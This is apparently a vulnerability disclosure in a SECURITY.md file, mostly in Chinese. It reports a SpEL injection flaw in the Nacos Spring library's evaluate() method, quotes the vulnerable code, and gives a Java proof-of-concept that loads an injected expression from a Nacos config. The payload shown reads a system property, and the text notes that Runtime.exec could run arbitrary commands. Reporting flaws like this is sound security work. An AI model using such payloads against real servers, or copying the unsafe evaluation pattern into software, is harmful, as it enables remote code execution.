# Security Policy

## Supported Versions

ALL

## Reporting a Vulnerability

在 NacosUtils.java:222 的 evaluate() 方法中存在 Spring Expression Language (SpEL) 注入漏洞。攻击者可以通过 Nacos 配置服务注入恶意 SpEL 表达式，在应用程序加载配置时实现远程代码执行（RCE）。
漏洞代码
// nacos-spring-context/src/main/java/com/alibaba/nacos/spring/util/NacosUtils.java:222
public static String evaluate(String value, Environment environment) {
    Expression expression = expressionCache.get(value);
    if (expression == null) {
        expression = parser.parseExpression(value, new TemplateParserContext());
        expressionCache.put(value, expression);
    }
    
    // 🔴 漏洞点: 使用 StandardEvaluationContext
    StandardEvaluationContext evaluationContext = environmentContextCache.get(environment);
    if (evaluationContext == null) {
        evaluationContext = new StandardEvaluationContext(environment);
        evaluationContext.addPropertyAccessor(new EnvironmentAccessor());
        environmentContextCache.put(environment, evaluationContext);
    }
    
    // 🔴 漏洞点: 外部输入直接作为代码执行，无任何验证
    return expression.getValue(evaluationContext, String.class);
}

NacosUtils.evaluate()函数调用链
[图片]

package com.example.security;

import com.alibaba.nacos.api.config.annotation.NacosValue;
import com.alibaba.nacos.spring.context.annotation.config.EnableNacosConfig;
import com.alibaba.nacos.spring.context.annotation.config.NacosPropertySource;
import org.springframework.context.annotation.AnnotationConfigApplicationContext;
import org.springframework.context.annotation.Configuration;
import org.springframework.stereotype.Component;

/**
 * 真实 Nacos 环境的 SpEL 注入漏洞演示
 *
 * 使用说明:
 * 1. 启动本地 Nacos Server (默认 http://127.0.0.1:8848)
 * 2. 在 Nacos 控制台创建配置:
 *    - Data ID: application.properties
 *    - Group: DEFAULT_GROUP
 *    - 配置内容见下方说明
 * 3. 运行本程序查看结果
 *
 * 安全测试配置内容:
 * app.name=MyApp
 * app.version=1.0.0
 * people.enable=true
 * people.list=admin,developer,tester
 * math.expression=10
 *
 * ⚠️ 漏洞验证配置 (仅在安全环境测试):
 * dangerous.payload=#{T(java.lang.System).getProperty('user.name')}
 */
@Configuration
@EnableNacosConfig(globalProperties = @com.alibaba.nacos.api.annotation.NacosProperties(
    serverAddr = "${nacos.server-addr:127.0.0.1:8848}",
    namespace = "${nacos.namespace:}",
    username = "${nacos.username:nacos}",
    password = "${nacos.password:nacos}"
))
@NacosPropertySource(dataId = "application.properties", groupId = "${nacos.group:DEFAULT_GROUP}", autoRefreshed = true)
public class RealNacosSpelInjectionDemo {

    public static void main(String[] args) throws InterruptedException {
        System.out.println("╔════════════════════════════════════════════════════════════╗");
        System.out.println("║  Real Nacos SpEL Injection Vulnerability Demo            ║");
        System.out.println("║  连接真实 Nacos 服务器的漏洞验证演示                        ║");
        System.out.println("╚════════════════════════════════════════════════════════════╝");
        System.out.println();

        try {
            // 创建 Spring 应用上下文
            AnnotationConfigApplicationContext context = new AnnotationConfigApplicationContext();
            context.register(RealNacosSpelInjectionDemo.class);
            context.register(ConfigBean.class);
            context.refresh();

            System.out.println("✅ 成功连接到 Nacos 服务器");
            System.out.println("📡 服务器地址: " + System.getProperty("nacos.server-addr", "127.0.0.1:8848"));
            System.out.println("👤 登录用户: " + System.getProperty("nacos.username", "nacos"));
            System.out.println();

            // 获取配置 Bean
            ConfigBean configBean = context.getBean(ConfigBean.class);

            System.out.println("============================================================");
            System.out.println("📊 配置读取结果（监听配置变化）");
            System.out.println("============================================================");
            System.out.println();

            // 显示当前配置值
            displayConfig(configBean);

            System.out.println("============================================================");
            System.out.println("🔄 配置热更新测试");
            System.out.println("============================================================");
            System.out.println("现在可以在 Nacos 控制台修改配置，观察自动刷新效果");
            System.out.println("等待 30 秒监听配置变化...");
            System.out.println();

            // 监听配置变化
            for (int i = 0; i < 6; i++) {
                Thread.sleep(5000);
                System.out.println("[" + (i + 1) * 5 + "秒] 当前配置:");
                displayConfig(configBean);
            }

            System.out.println();
            System.out.println("============================================================");
            System.out.println("📝 测试总结");
            System.out.println("============================================================");
            System.out.println("🔴 SpEL 注入漏洞验证:");
            System.out.println("   - 代码中只有简单的占位符: ${dangerous.payload}");
            System.out.println("   - 但攻击者可以在 Nacos 中注入 SpEL 表达式");
            System.out.println("   - 例如: dangerous.payload=#{T(java.lang.System).getProperty('user.name')}");
            System.out.println("   - 风险: 可执行任意 Java 代码，如 T(java.lang.Runtime).exec('...')");
            System.out.println();

            context.close();

        } catch (Exception e) {
            System.err.println("❌ 错误: " + e.getMessage());
            System.err.println();
            System.err.println("可能的原因:");
            System.err.println("1. Nacos 服务器未启动 (默认端口 8848)");
            System.err.println("2. 配置文件不存在 (Data ID: application.properties, Group: DEFAULT_GROUP)");
            System.err.println("3. 网络连接问题");
            System.err.println();
            System.err.println("解决方案:");
            System.err.println("1. 启动 Nacos Server: sh startup.sh -m standalone");
            System.err.println("2. 访问控制台: http://127.0.0.1:8848/nacos (用户名/密码: nacos/nacos)");
            System.err.println("3. 创建配置文件并添加测试配置内容");
            e.printStackTrace();
        }
    }

    private static void displayConfig(ConfigBean bean) {
        System.out.println("  • dangerous.payload: " + bean.getDangerousInfo());
        System.out.println();
    }

    /**
     * 配置 Bean - 演示 SpEL 注入漏洞
     */
    @Component
    public static class ConfigBean {

        // 🔴 危险: 看起来很"安全"的配置，但攻击者可以在 Nacos 中注入 SpEL 表达式
        // Nacos 配置示例: dangerous.payload=#{T(java.lang.System).getProperty('user.name')}
        @NacosValue(value = "${dangerous.payload:SafeDefaultValue}", autoRefreshed = true)
        private String dangerousInfo;

        // Getter
        public String getDangerousInfo() { return dangerousInfo; }
    }
}
